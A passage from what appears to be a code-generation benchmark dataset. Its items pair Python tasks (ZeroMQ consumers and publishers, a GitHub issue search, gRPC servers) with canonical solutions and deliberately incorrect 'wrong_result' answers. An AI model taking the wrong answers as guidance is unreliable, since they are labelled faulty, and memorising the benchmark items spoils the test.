    "Instruction": "Task Description: Implement a ZeroMQ-based consumer class in Python that subscribes to messages from a publisher, processes token information from shared memory requests, and manages resource recycling.\n\nClass Description: The ZeroMQConsumer class is responsible for receiving and processing messages from a detokenization service via ZeroMQ's PUB/SUB pattern. It manages shared memory requests, tracks request statuses, and handles resource recycling when requests are completed.\n\nAttributes:\n- context: zmq.asyncio.Context - ZeroMQ asynchronous context for managing sockets\n- recv_from_detokenization: zmq.SUB - SUB socket for receiving messages from the publisher\n- shm_req_manager: ShmReqManager - Manager for shared memory request objects\n- req_id_to_out_inf: Dict[int, ReqStatus] - Dictionary mapping request IDs to their status objects\n- recycle_event: asyncio.Event - Event flag for triggering resource recycling\n\nMethods:\n- __init__(zmq_mode: str, detokenization_pub_port: int, shm_req_manager: ShmReqManager) -> None - Initializes the consumer with ZeroMQ configuration and shared memory manager\n- handle_loop() -> None - Main processing loop that receives messages and manages token output\n- recycle_resource_loop() -> None - Background loop for recycling completed request resources\n\nHelper Class (ReqStatus):\n- __init__(group_request_id, multimodal_params, req_objs: List[Req], start_time) -> None - Tracks status of a request group\n- can_release() -> bool - Determines if all requests in the group can be released",
    "Canonical_solution": "import zmq\nimport zmq.asyncio\nfrom typing import Dict\nfrom lightllm.server.core.objs import Req\nfrom lightllm.server.core.objs.shm_req_manager import ShmReqManager\nfrom lightllm.server.core.objs.io_objs import GroupReqObjs\nimport asyncio\n\nclass ZeroMQConsumer:\n    def __init__(self, zmq_mode: str, detokenization_pub_port: int, shm_req_manager: ShmReqManager):\n        self.context = zmq.asyncio.Context()\n        self.recv_from_detokenization = self.context.socket(zmq.SUB)\n        self.recv_from_detokenization.connect(f\"{zmq_mode}127.0.0.1:{detokenization_pub_port}\")\n        self.recv_from_detokenization.setsockopt(zmq.SUBSCRIBE, b\"\")\n        self.shm_req_manager = shm_req_manager\n        self.req_id_to_out_inf: Dict[int, ReqStatus] = {}\n        self.recycle_event = asyncio.Event()\n\n    async def handle_loop(self):\n        asyncio.create_task(self.recycle_resource_loop())\n        \n        while True:\n            try:\n                await asyncio.wait_for(self.recv_from_detokenization.recv_pyobj(), timeout=0.05)\n            except asyncio.TimeoutError:\n                pass\n\n            for req_status in self.req_id_to_out_inf.values():\n                token_list = []\n                for req in req_status.group_req_objs.shm_req_objs:\n                    req_id = req.request_id\n                    if not req.out_tokens_queue.is_empty():\n                        text, src_index, special, count_output_tokens = req.out_tokens_queue.peek()\n                        metadata = {\n                            \"id\": int(req.shm_prompt_ids.arr[src_index]),\n                            \"logprob\": float(req.shm_logprobs.arr[src_index]),\n                            \"special\": special,\n                            \"count_output_tokens\": count_output_tokens,\n                            \"prompt_cache_len\": req.prompt_cache_len,\n                        }\n                        req.out_tokens_queue.pop_no_ret()\n\n                        if req.finish_token_index != src_index:\n                            token_list.append((req_id, text, metadata, FinishStatus()))\n                        else:\n                            finish_status = FinishStatus(req.finish_status.status)\n                            token_list.append((req_id, text, metadata, finish_status))\n\n                async with req_status.lock:\n                    req_status.out_token_info_list.extend(token_list)\n                    req_status.event.set()\n\n            self.recycle_event.set()\n\n    async def recycle_resource_loop(self):\n        while True:\n            try:\n                await asyncio.wait_for(self.recycle_event.wait(), timeout=0.02)\n            except asyncio.TimeoutError:\n                pass\n            self.recycle_event.clear()\n\n            release_req_status = []\n            for req_status in self.req_id_to_out_inf.values():\n                if req_status.can_release():\n                    release_req_status.append(req_status)\n\n            for req_status in release_req_status:\n                self.req_id_to_out_inf.pop(req_status.group_req_objs.group_req_id, None)\n                for req in req_status.group_req_objs.shm_req_objs:\n                    await self.shm_req_manager.async_put_back_req_obj(req)\n                    await self.shm_req_manager.async_release_req_index(req.index_in_shm_mem)\n\nclass ReqStatus:\n    def __init__(self, group_request_id, multimodal_params, req_objs: List[Req], start_time) -> None:\n        self.lock = asyncio.Lock()\n        self.event = asyncio.Event()\n        self.group_req_objs = GroupReqObjs(\n            group_req_id=group_request_id,\n            multimodal_params=multimodal_params,\n            shm_req_objs=req_objs,\n            time_mark=start_time,\n        )\n        self.out_token_info_list = []\n\n    def can_release(self):\n        for req in self.group_req_objs.shm_req_objs:\n            if not req.can_release():\n                return False\n        return True",
    "Code_level": "Class-level",
    "FSMID_for_test": 85,
    "wrong_result": "class ZeroMQConsumer:\n    def __init__(self, zmq_mode: str, detokenization_pub_port: int, shm_req_manager: ShmReqManager) -> None:\n        self.context = zmq.asyncio.Context()\n        self.recv_from_detokenization = self.context.socket(zmq.SUB)\n        self.recv_from_detokenization.connect(f\"tcp://127.0.0.1:{detokenization_pub_port}\")\n        self.recv_from_detokenization.setsockopt_string(zmq.SUBSCRIBE, \"\")\n        self.shm_req_manager = shm_req_manager\n        self.req_id_to_out_inf = {}\n        self.recycle_event = asyncio.Event()\n\n    async def handle_loop(self) -> None:\n        while True:\n            message = await self.recv_from_detokenization.recv_json()\n            group_request_id = message.get(\"group_request_id\")\n            multimodal_params = message.get(\"multimodal_params\")\n            req_objs = message.get(\"req_objs\")\n            start_time = message.get(\"start_time\")\n            req_status = ReqStatus(group_request_id, multimodal_params, req_objs, start_time)\n            self.req_id_to_out_inf[group_request_id] = req_status\n            # Process token information and manage resource recycling\n            if req_status.can_release():\n                self.recycle_event.set()\n\n    async def recycle_resource_loop(self) -> None:\n        while True:\n            await self.recycle_event.wait()\n            # Recycle resources for completed requests\n            for req_id, req_status in list(self.req_id_to_out_inf.items()):\n                if req_status.can_release():\n                    self.shm_req_manager.recycle_request(req_id)\n                    del self.req_id_to_out_inf[req_id]\n            self.recycle_event.clear()\n\n\nclass ReqStatus:\n    def __init__(self, group_request_id, multimodal_params, req_objs: List[Req], start_time) -> None:\n        self.group_request_id = group_request_id\n        self.multimodal_params = multimodal_params\n        self.req_objs = req_objs\n        self.start_time = start_time\n        self.completed = False\n\n    def can_release(self) -> bool:\n        return all(req.is_completed() for req in self.req_objs) and (time.time() - self.start_time) > 30"
  },
  {
    "Task_id": 48,
    "Instruction": "Task Description: Implement an asynchronous function to search GitHub issues using the GitHub API, handling authentication and response processing.\n\nFunction Description: The function `search_github_issues` asynchronously searches for GitHub issues based on a query string, with options to specify the repository, number of results, and an optional API token. It handles authentication, sends an HTTP GET request to the GitHub API, processes the response, and returns a formatted summary of the issues found.\n\nInput:\n- `query`: str - The search query string for GitHub issues.\n- `repo`: str (optional, default=\"prefecthq/prefect\") - The repository to search in, formatted as \"owner/repo\".\n- `n`: int (optional, default=3) - The maximum number of issues to return.\n- `api_token`: Optional[str] (optional, default=None) - The GitHub API token for authentication. If not provided, the function attempts to retrieve it from various sources.\n\nOutput:\n- str - A formatted string summarizing the found GitHub issues, including their titles, URLs, and truncated bodies. Returns \"No issues found.\" if no issues match the query.",
    "Canonical_solution": "import os\nimport httpx\nfrom typing import Optional\n\nasync def get_token() -> str:\n    try:\n        from prefect.blocks.system import Secret\n        return (await Secret.load(name=\"github-token\")).get()  # type: ignore\n    except (ImportError, ValueError) as exc:\n        getattr(get_logger(\"marvin\"), \"debug_kv\")(\n            (\n                \"Prefect Secret for GitHub token not retrieved. \"\n                f\"{exc.__class__.__name__}: {exc}\"\n                \"red\"\n            ),\n        )\n\n    try:\n        return getattr(marvin.settings, \"github_token\")\n    except AttributeError:\n        pass\n\n    if token := os.environ.get(\"MARVIN_GITHUB_TOKEN\", \"\"):\n        return token\n\n    raise RuntimeError(\"GitHub token not found\")\n\nasync def search_github_issues(\n    query: str,\n    repo: str = \"prefecthq/prefect\",\n    n: int = 3,\n    api_token: Optional[str] = None,\n) -> str:\n    headers = {\"Accept\": \"application/vnd.github.v3+json\"}\n    headers[\"Authorization\"] = f\"Bearer {api_token or await get_token()}\"\n\n    async with httpx.AsyncClient() as client:\n        response = await client.get(\n            \"https://api.github.com/search/issues\",\n            headers=headers,\n            params={\n                \"q\": query if \"repo:\" in query else f\"repo:{repo} {query}\",\n                \"order\": \"desc\",\n                \"per_page\": n,\n            },\n        )\n        response.raise_for_status()\n\n    issues_data = response.json()[\"items\"]\n\n    for issue in issues_data:\n        if not issue[\"body\"]:\n            continue\n        issue[\"body\"] = slice_tokens(issue[\"body\"], 1000)\n\n    issues = [GitHubIssue(**issue) for issue in issues_data]\n\n    summary = \"\\n\\n\".join(\n        f\"{issue.title} ({issue.html_url}):\\n{issue.body}\" for issue in issues\n    )\n    if not summary.strip():\n        return \"No issues found.\"\n    return summary",
    "Code_level": "Function-level",
    "FSMID_for_test": 59,
    "wrong_result": "import asyncio\nimport os\nimport requests\nfrom typing import Optional, List, Dict, Any\n\nasync def search_github_issues(query: str, repo: str = \"prefecthq/prefect\", n: int = 3, api_token: Optional[str] = None) -> str:\n    if not api_token:\n        api_token = os.getenv(\"GITHUB_TOKEN\")\n        if not api_token:\n            raise ValueError(\"GitHub API token is required and not provided in environment variables.\")\n    \n    url = f\"https://api.github.com/search/issues?q={query}&repo={repo}&per_page={n}\"\n    headers = {\"Authorization\": f\"token {api_token}\"}\n    \n    try:\n        response = await asyncio.get_event_loop().run_in_executor(None, requests.get, url, headers=headers)\n        response.raise_for_status()\n        data = response.json()\n        \n        if not data[\"items\"]:\n            return \"No issues found.\"\n        \n        summary = []\n        for item in data[\"items\"]:\n            title = item[\"title\"]\n            url = item[\"html_url\"]\n            body = item[\"body\"][:200] + \"...\"\n            summary.append(f\"Title: {title}\\nURL: {url}\\nBody: {body}\\n\")\n        \n        return \"\\n\".join(summary)\n    \n    except requests.RequestException as e:\n        return f\"Error searching GitHub issues: {str(e)}\""
  },
  {
    "Task_id": 481,
    "Instruction": "Task Description: Implement a multi-process data processing system using ZeroMQ for inter-process communication, where worker processes apply a mapping function to incoming data points and return the results.\n\nClass Description: MultiProcessMapDataZMQ is a class that manages multiple worker processes for parallel data processing using ZeroMQ's REQ/REP pattern. It handles process creation, communication, and data serialization.\n\nAttributes:\n- ds: [Any] - The data source to be processed\n- num_proc: [int] - Number of worker processes to create\n- map_func: [callable] - Function to apply to each data point\n- _buffer_size: [int] - High water mark for ZeroMQ sockets\n- _strict: [bool] - Whether to enforce strict processing rules\n- _procs: [list] - List of worker processes\n- context: [zmq.Context] - ZeroMQ context\n- socket: [zmq.Socket] - Main DEALER socket for communication\n- _proc_ids: [list] - List of process identifiers\n\nMethods:\n- __init__(ds, num_proc=None, map_func=None, *, buffer_size=200, strict=False) -> None - Initializes the multi-process mapper with configuration parameters\n- reset_state() -> None - Sets up ZeroMQ context, sockets, and starts worker processes\n- _create_worker(id, pipename, hwm) -> _Worker - Creates a worker process instance\n- _send(dp) -> None - Sends a data point to workers\n- _recv() -> Any - Receives processed data from workers\n\nNested _Worker Class:\n- __init__(identity, map_func, pipename, hwm) -> None - Initializes a worker process\n- run() -> None - Worker's main loop that processes incoming data using REQ/REP pattern",
    "Canonical_solution": "import zmq\nimport multiprocessing as mp\nfrom ..utils.serialize import dumps_once as dumps, loads_once as loads\nfrom ..utils.concurrency import enable_death_signal\n\nclass MultiProcessMapDataZMQ:\n    class _Worker(mp.Process):\n        def __init__(self, identity, map_func, pipename, hwm):\n            super(MultiProcessMapDataZMQ._Worker, self).__init__()\n            self.identity = identity\n            self.map_func = map_func\n            self.pipename = pipename\n            self.hwm = hwm\n\n        def run(self):\n            enable_death_signal(_warn=self.identity == b'0')\n            ctx = zmq.Context()\n            socket = ctx.socket(zmq.REP)\n            socket.setsockopt(zmq.IDENTITY, self.identity)\n            socket.set_hwm(self.hwm)\n            socket.connect(self.pipename)\n\n            while True:\n                dp = loads(socket.recv(copy=False))\n                dp = self.map_func(dp)\n                socket.send(dumps(dp), copy=False)\n\n    def __init__(self, ds, num_proc=None, map_func=None, *, buffer_size=200, strict=False):\n        self.ds = ds\n        self.num_proc = num_proc\n        self.map_func = map_func\n        self._buffer_size = buffer_size\n        self._strict = strict\n        self._procs = []\n\n    def reset_state(self):\n        self.context = zmq.Context()\n        self.socket = self.context.socket(zmq.DEALER)\n        self.socket.set_hwm(self._buffer_size * 2)\n        pipename = _get_pipe_name('dataflow-map')\n        _bind_guard(self.socket, pipename)\n\n        self._proc_ids = [u'{}'.format(k).encode('utf-8') for k in range(self.num_proc)]\n        worker_hwm = int(self._buffer_size * 2 // self.num_proc)\n        self._procs = [self._create_worker(self._proc_ids[k], pipename, worker_hwm)\n                       for k in range(self.num_proc)]\n\n        self._start_processes()\n\n    def _create_worker(self, id, pipename, hwm):\n        return MultiProcessMapDataZMQ._Worker(id, self.map_func, pipename, hwm)\n\n    def _send(self, dp):\n        msg = [b\"\", dumps(dp)]\n        self.socket.send_multipart(msg, copy=False)\n\n    def _recv(self):\n        msg = self.socket.recv_multipart(copy=False)\n        dp = loads(msg[1])\n        return dp",
    "Code_level": "Class-level",
    "FSMID_for_test": 87,
    "wrong_result": "class MultiProcessMapDataZMQ:\n    def __init__(self, ds, num_proc=None, map_func=None, *, buffer_size=200, strict=False):\n        self.ds = ds\n        self.num_proc = num_proc or 1\n        self.map_func = map_func\n        self._buffer_size = buffer_size\n        self._strict = strict\n        self._procs = []\n        self.context = None\n        self.socket = None\n        self._proc_ids = []\n\n    def reset_state(self):\n        self.context = zmq.Context()\n        self.socket = self.context.socket(zmq.DEALER)\n        self.socket.set_hwm(self._buffer_size)\n        self._procs = []\n        self._proc_ids = []\n        for i in range(self.num_proc):\n            pipename = f\"zmq_pipe_{i}\"\n            worker = self._create_worker(i, pipename, self._buffer_size)\n            self._procs.append(worker)\n            self._proc_ids.append(pipename)\n\n    def _create_worker(self, id, pipename, hwm):\n        return _Worker(id, self.map_func, pipename, hwm)\n\n    def _send(self, dp):\n        self.socket.send_pyobj(dp)\n\n    def _recv(self):\n        return self.socket.recv_pyobj()\n\nclass _Worker:\n    def __init__(self, identity, map_func, pipename, hwm):\n        self.identity = identity\n        self.map_func = map_func\n        self.pipename = pipename\n        self.hwm = hwm\n        self.context = zmq.Context()\n        self.socket = self.context.socket(zmq.REQ)\n        self.socket.set_hwm(hwm)\n        self.socket.connect(f\"ipc://{pipename}\")\n        self.socket.setsockopt(zmq.IDENTITY, str(identity).encode())\n\n    def run(self):\n        while True:\n            self.socket.recv_pyobj()\n            dp = next(self.ds)\n            result = self.map_func(dp)\n            self.socket.send_pyobj(result)"
  },
  {
    "Task_id": 482,
    "Instruction": "Task Description: Create a ZeroMQ Publisher (PUB) handler class that can send metrics over a TCP connection using the PUB/SUB pattern.\n\nClass Description: The `zmqHandler` class is a ZeroMQ-based publisher that inherits from a base `Handler` class. It establishes a PUB socket to publish metrics to subscribers. The class handles socket creation, binding, and message sending.\n\nAttributes:\n- context: [zmq.Context] - ZeroMQ context for managing sockets\n- socket: [zmq.Socket] - PUB socket for sending messages\n- port: [int] - Port number to bind the socket to\n- enabled: [bool] - Flag indicating if the handler is operational (inherited)\n- config: [dict] - Configuration dictionary (inherited)\n- log: [Logger] - Logger instance (inherited)\n\nMethods:\n- __init__(config: dict) -> None - Constructor that initializes the handler with configuration\n  Input: config - Dictionary containing configuration parameters\n  Output: None\n\n- _bind() -> None - Internal method to create and bind the PUB socket\n  Input: None\n  Output: None\n\n- process(metric: Any) -> None - Publishes a metric through the PUB socket\n  Input: metric - The data to be published (converted to string)\n  Output: None",
    "Canonical_solution": "import zmq\nfrom Handler import Handler\n\nclass zmqHandler(Handler):\n    def __init__(self, config=None):\n        Handler.__init__(self, config)\n        \n        if not zmq:\n            self.log.error('zmq import failed. Handler disabled')\n            self.enabled = False\n            return\n\n        self.context = None\n        self.socket = None\n        self.port = int(self.config['port'])\n        self._bind()\n\n    def _bind(self):\n        if not zmq:\n            return\n        self.context = zmq.Context()\n        self.socket = self.context.socket(zmq.PUB)\n        self.socket.bind(\"tcp://*:%i\" % self.port)\n\n    def process(self, metric):\n        if not zmq:\n            return\n        self.socket.send(\"%s\" % str(metric))",
    "Code_level": "Class-level",
    "FSMID_for_test": 88,
    "wrong_result": "class zmqHandler(Handler):\n    def __init__(self, config: dict) -> None:\n        super().__init__(config)\n        self.context = zmq.Context()\n        self.socket = self.context.socket(zmq.PUB)\n        self.port = int(config.get('port', 5555))\n        self.enabled = True\n        self.config = config\n        self.log = logging.getLogger(__name__)\n\n    def _bind(self) -> None:\n        self.socket.bind(f\"tcp://*:{self.port}\")\n\n    def process(self, metric: Any) -> None:\n        if self.enabled:\n            self.socket.send_string(str(metric))"
  },
  {
    "Task_id": 488,
    "Instruction": "Task Description: Implement a gRPC server class in Python that handles multiple types of RPC calls (Call, Train, Index, Search, StreamCall) and manages concurrent requests using a thread pool. The server should integrate with a ZeroMQ client for message passing and provide proper context management for resource cleanup.\n\nClass Description: FrontendService is a gRPC server implementation that processes incoming gRPC requests and forwards them to a backend service via ZeroMQ. It handles concurrent requests, manages server lifecycle, and provides streaming capabilities.\n\nAttributes:\n\n- server: [grpc.Server] - The gRPC server instance handling incoming requests\n- bind_address: [str] - The address and port where the server listens (format \"host:port\")\n- _stop_event: [threading.Event] - Event object used to signal server shutdown\n- args: [Namespace/object] - Configuration arguments for server setup (max_concurrency, max_message_size, etc.)\n\nMethods:\n\n- __init__(args) -> [None] - Initializes the gRPC server with thread pool executor and configures message size limits\n  Input: args - Configuration object containing server parameters\n- __enter__() -> [FrontendService] - Starts the gRPC server and clears stop event (context manager entry)\n- __exit__(exc_type, exc_val, exc_tb) -> [None] - Stops the gRPC server and triggers cleanup (context manager exit)\n  Input: exc_type, exc_val, exc_tb - Exception information if any occurred\n- stop() -> [None] - Signals the server to stop by setting the stop event\n- join() -> [None] - Waits for the server to complete shutdown\n- _Servicer: [Nested class] - Handles actual gRPC method implementations\n  Methods:\n    - Call(request, context) -> [gnes_pb2.Response] - Processes standard RPC calls\n      Input: request - gRPC request message, context - gRPC context object\n      Output: Processed response message\n    - Train(request, context) -> [gnes_pb2.Response] - Handles training requests\n    - Index(request, context) -> [gnes_pb2.Response] - Handles indexing requests\n    - Search(request, context) -> [gnes_pb2.Response] - Handles search requests\n    - StreamCall(request_iterator, context) -> [Iterator[gnes_pb2.Response]] - Handles streaming RPC calls\n      Input: request_iterator - Iterator of incoming streaming requests\n      Output: Iterator of response messages\n    - ZmqContext: [Nested class] - Manages ZeroMQ client lifecycle\n      Methods:\n        - __init__(args) -> [None] - Initializes thread-local storage for ZMQ client\n        - __enter__() -> [ZmqClient] - Creates and returns a ZMQ client instance\n        - __exit__(exc_type, exc_value, exc_traceback) -> [None] - Cleans up ZMQ client resources",
    "Canonical_solution": "import grpc\nfrom concurrent.futures import ThreadPoolExecutor\nfrom ..proto import gnes_pb2_grpc, gnes_pb2\nfrom ..client.base import ZmqClient\nimport threading\n\nclass FrontendService:\n    def __init__(self, args):\n        self.server = grpc.server(\n            ThreadPoolExecutor(max_workers=args.max_concurrency),\n            options=[('grpc.max_send_message_length', args.max_message_size),\n                     ('grpc.max_receive_message_length', args.max_message_size)])\n        gnes_pb2_grpc.add_GnesRPCServicer_to_server(self._Servicer(args), self.server)\n        self.bind_address = '{0}:{1}'.format(args.grpc_host, args.grpc_port)\n        self.server.add_insecure_port(self.bind_address)\n        self._stop_event = threading.Event()\n\n    def __enter__(self):\n        self.server.start()\n        self._stop_event.clear()\n        return self\n\n    def __exit__(self, exc_type, exc_val, exc_tb):\n        self.server.stop(None)\n        self.stop()\n\n    def stop(self):\n        self._stop_event.set()\n\n    def join(self):\n        self._stop_event.wait()\n\n    class _Servicer(gnes_pb2_grpc.GnesRPCServicer):\n        def __init__(self, args):\n            self.args = args\n            self.zmq_context = self.ZmqContext(args)\n            self.request_id_cnt = 0\n            self.send_recv_kwargs = dict(\n                check_version=self.args.check_version,\n                timeout=self.args.timeout,\n                squeeze_pb=self.args.squeeze_pb)\n            self.pending_request = 0\n\n        def Call(self, request, context):\n            with self.zmq_context as zmq_client:\n                zmq_client.send_message(self.add_envelope(request, zmq_client), **self.send_recv_kwargs)\n                return self.remove_envelope(zmq_client.recv_message(**self.send_recv_kwargs))\n\n        def Train(self, request, context):\n            return self.Call(request, context)\n\n        def Index(self, request, context):\n            return self.Call(request, context)\n\n        def Search(self, request, context):\n            return self.Call(request, context)\n\n        def StreamCall(self, request_iterator, context):\n            self.pending_request = 0\n\n            def get_response(num_recv, blocked=False):\n                for _ in range(num_recv):\n                    if blocked or zmq_client.receiver.poll(1):\n                        msg = zmq_client.recv_message(**self.send_recv_kwargs)\n                        self.pending_request -= 1\n                        yield self.remove_envelope(msg)\n\n                while zmq_client.receiver.poll(1):\n                    msg = zmq_client.recv_message(**self.send_recv_kwargs)\n                    self.pending_request -= 1\n                    yield self.remove_envelope(msg)\n\n            with self.zmq_context as zmq_client:\n                for request in request_iterator:\n                    num_recv = max(self.pending_request - self.args.max_pending_request, 1)\n                    yield from get_response(num_recv, num_recv > 1)\n                    zmq_client.send_message(self.add_envelope(request, zmq_client), **self.send_recv_kwargs)\n                    self.pending_request += 1\n\n                yield from get_response(self.pending_request, blocked=True)\n\n        class ZmqContext:\n            def __init__(self, args):\n                self.args = args\n                self.tlocal = threading.local()\n                self.tlocal.client = None\n\n            def __enter__(self):\n                client = ZmqClient(self.args)\n                self.tlocal.client = client\n                return client\n\n            def __exit__(self, exc_type, exc_value, exc_traceback):\n                self.tlocal.client.close()\n                self.tlocal.client = None",
    "Code_level": "Class-level",
    "FSMID_for_test": 74,
    "wrong_result": "import grpc\nimport threading\nimport zmq\nfrom concurrent import futures\nfrom contextlib import contextmanager\nfrom typing import Any, Iterator, Optional, Tuple, Union\nimport gnes_pb2\nimport gnes_pb2_grpc\n\nclass FrontendService:\n    def __init__(self, args):\n        self.server = grpc.server(futures.ThreadPoolExecutor(max_workers=args.max_concurrency))\n        gnes_pb2_grpc.add_FrontendServiceServicer_to_server(self._Servicer(), self.server)\n        self.bind_address = args.bind_address\n        self._stop_event = threading.Event()\n        self.args = args\n\n    def __enter__(self):\n        self.server.start()\n        self._stop_event.clear()\n        return self\n\n    def __exit__(self, exc_type, exc_val, exc_tb):\n        self.stop()\n        self.server.stop(None)\n\n    def stop(self):\n        self._stop_event.set()\n\n    def join(self):\n        self._stop_event.wait()\n\n    class _Servicer:\n        def __init__(self):\n            self.zmq_context = self.ZmqContext()\n\n        def Call(self, request, context):\n            response = self.zmq_context.send_request(request)\n            return response\n\n        def Train(self, request, context):\n            response = self.zmq_context.send_request(request)\n            return response\n\n        def Index(self, request, context):\n            response = self.zmq_context.send_request(request)\n            return response\n\n        def Search(self, request, context):\n            response = self.zmq_context.send_request(request)\n            return response\n\n        def StreamCall(self, request_iterator, context):\n            for request in request_iterator:\n                response = self.zmq_context.send_request(request)\n                yield response\n\n        class ZmqContext:\n            def __init__(self):\n                self.context = zmq.Context()\n                self.socket = self.context.socket(zmq.REQ)\n                self.socket.connect(\"tcp://localhost:5555\")\n\n            def __enter__(self):\n                self.socket = self.context.socket(zmq.REQ)\n                self.socket.connect(\"tcp://localhost:5555\")\n                return self.socket\n\n            def __exit__(self, exc_type, exc_value, exc_traceback):\n                self.socket.close()\n                self.context.term()\n\n            def send_request(self, request):\n                self.socket.send_pyobj(request)\n                return self.socket.recv_pyobj()"
  },
  {
    "Task_id": 489,
    "Instruction": "Task Description: Implement a gRPC server in Python that handles model inference requests, supports both single and streaming responses, and provides graceful termination capabilities.\n\nClass Description: ModelResponse is a gRPC servicer class that implements model inference services. It manages request processing, response generation, and server lifecycle events.\n\nAttributes:\n- _stop_event: [threading.Event] - Event flag for server termination control\n- inference_pipeline: [AsyncPipeline] - Pipeline for handling asynchronous inference requests\n- method_name_to_task: [Dict[str, str]] - Mapping between gRPC method names and task types\n- lock: [threading.Lock] - Thread synchronization primitive for concurrent access control\n\nMethods:\n- __init__: [Name](async_pipeline: AsyncPipeline = None) -> None - Initializes the servicer with an optional async pipeline\n- Terminate: [Name](request: google.protobuf.Empty, context: grpc.ServicerContext) -> google.protobuf.Empty - Signals server to stop processing new requests\n- get_stop_event: [Name]() -> threading.Event - Returns the stop event for server control\n- GeneratorReply: [Name](request: ModelRequest, context: grpc.ServicerContext) -> ModelResponse - Handles batch inference requests and returns a single response\n- GeneratorReplyStream: [Name](request: ModelRequest, context: grpc.ServicerContext) -> Iterator[ModelResponse] - Handles streaming inference requests and yields multiple responses\n- _get_task_methods: [Name](method_name: str) -> Dict[str, TaskMethods] - Retrieves task-specific methods for request processing\n\nFunction Description: _do_serve sets up and runs the gRPC server with specified configuration and service implementation.\n\nInput:\n- service_impl: [ModelResponse] - The service implementation instance\n- port: [int] - Port number for server binding\n- interceptors: [List[grpc.ServerInterceptor]] - Optional list of gRPC interceptors\n\nOutput: None (runs the server until termination signal is received)",
    "Canonical_solution": "import grpc\nfrom concurrent import futures\nfrom typing import Dict\nimport threading\nfrom google.protobuf import empty_pb2 as google_dot_protobuf_dot_empty__pb2\nfrom mii.grpc_related.proto import modelresponse_pb2_grpc\nfrom mii.constants import LB_MAX_WORKER_THREADS, GRPC_MAX_MSG_SIZE, SERVER_SHUTDOWN_TIMEOUT\n\nclass ModelResponse(modelresponse_pb2_grpc.ModelResponseServicer):\n    def __init__(self, async_pipeline=None):\n        self._stop_event = threading.Event()\n        self.inference_pipeline = async_pipeline\n        self.method_name_to_task = {m.method: t for t, m in TASK_METHODS_DICT.items()}\n        self.lock = threading.Lock()\n\n    def Terminate(self, request, context):\n        self._stop_event.set()\n        return google_dot_protobuf_dot_empty__pb2.Empty()\n\n    def get_stop_event(self):\n        return self._stop_event\n\n    def GeneratorReply(self, request, context):\n        task_methods = self._get_task_methods(\"GeneratorReply\")\n        prompts, kwargs = task_methods.unpack_request_from_proto(request)\n        uids_put_order, uids_running, uids_complete_order, responses = [], [], [], []\n\n        try:\n            for p in prompts:\n                request_kwargs = kwargs.copy()\n                uid = self.inference_pipeline.put_request(p, request_kwargs)\n                uids_put_order.append(uid)\n                uids_running.append(uid)\n\n            while uids_running:\n                uid, response = self.inference_pipeline.get_response()\n                if uid == -1:\n                    uid = uids_running[0]\n                responses.append(response)\n                self.inference_pipeline.flush_uid(uid)\n                uids_complete_order.append(uids_put_order.index(uid))\n                uids_running.remove(uid)\n\n            responses = [\n                r for idx,\n                r in sorted(zip(uids_complete_order,\n                                responses),\n                            key=lambda pair: pair[0])\n            ]\n            return task_methods.pack_response_to_proto(responses)\n        finally:\n            [self.inference_pipeline.flush_uid(uid) for uid in uids_running]\n\n    def GeneratorReplyStream(self, request, context):\n        task_methods = self._get_task_methods(\"GeneratorReply\")\n        prompts, kwargs = task_methods.unpack_request_from_proto(request)\n        uid = self.inference_pipeline.put_request(prompts[0], kwargs)\n\n        while True:\n            response_uid, r = self.inference_pipeline.get_response()\n            assert uid == response_uid, \"uid mismatch\"\n            done = r.finish_reason != GenerationFinishReason.NONE\n            response = task_methods.pack_response_to_proto([r])\n            yield response\n            if done:\n                break\n\n        self.inference_pipeline.flush_uid(uid)\n\n    def _get_task_methods(self, method_name: str) -> Dict[str, TaskMethods]:\n        if method_name not in self.method_name_to_task:\n            raise ValueError(f\"unknown method: {method_name}\")\n\n        task = self.method_name_to_task[method_name]\n        if task not in TASK_METHODS_DICT:\n            raise ValueError(f\"unknown task: {task}\")\n\n        return TASK_METHODS_DICT[task]\n\ndef _do_serve(service_impl, port, interceptors=[]):\n    stop_event = service_impl.get_stop_event()\n    server = grpc.server(\n        futures.ThreadPoolExecutor(max_workers=LB_MAX_WORKER_THREADS),\n        interceptors=interceptors,\n        options=[\n            (\"grpc.max_send_message_length\", GRPC_MAX_MSG_SIZE),\n            (\"grpc.max_receive_message_length\", GRPC_MAX_MSG_SIZE)\n        ]\n    )\n    modelresponse_pb2_grpc.add_ModelResponseServicer_to_server(service_impl, server)\n    server.add_insecure_port(f\"[::]:{port}\")\n    server.start()\n    stop_event.wait()\n    server.stop(SERVER_SHUTDOWN_TIMEOUT)",
    "Code_level": "Class-level",
    "FSMID_for_test": 74,
    "wrong_result": "def _do_serve(service_impl, port, interceptors):\n    server = grpc.server(\n        grpc.multiplexed_server(\n            interceptors=interceptors if interceptors else []\n        )\n    )\n    service_impl.register(server)\n    server.add_insecure_port(f\"[::]:{port}\")\n    server.start()\n    try:\n        while True:\n            time.sleep(1)\n    except KeyboardInterrupt:\n        service_impl._stop_event.set()\n        server.stop(0)\n\nclass ModelResponse(grpc.ServicerMixin):\n    def __init__(self, async_pipeline: AsyncPipeline = None):\n        self._stop_event = threading.Event()\n        self.inference_pipeline = async_pipeline\n        self.method_name_to_task = {\n            \"GeneratorReply\": \"batch\",\n            \"GeneratorReplyStream\": \"stream\"\n        }\n        self.lock = threading.Lock()\n\n    def Terminate(self, request, context):\n        self._stop_event.set()\n        return google.protobuf.Empty()\n\n    def get_stop_event(self):\n        return self._stop_event\n\n    def GeneratorReply(self, request, context):\n        with self.lock:\n            task = self.method_name_to_task[context.invocation_method]\n            if task == \"batch\":\n                result = self.inference_pipeline.process(request)\n                return ModelResponse(result)\n            else:\n                raise ValueError(\"Streaming not supported for this method\")\n\n    def GeneratorReplyStream(self, request, context):\n        with self.lock:\n            task = self.method_name_to_task[context.invocation_method]\n            if task == \"stream\":\n                for response in self.inference_pipeline.stream(request):\n                    yield ModelResponse(response)\n            else:\n                raise ValueError(\"Batch not supported for this method\")\n\n    def _get_task_methods(self, method_name):\n        return self.method_name_to_task.get(method_name, {})"
  },
  {
    "Task_id": 493,
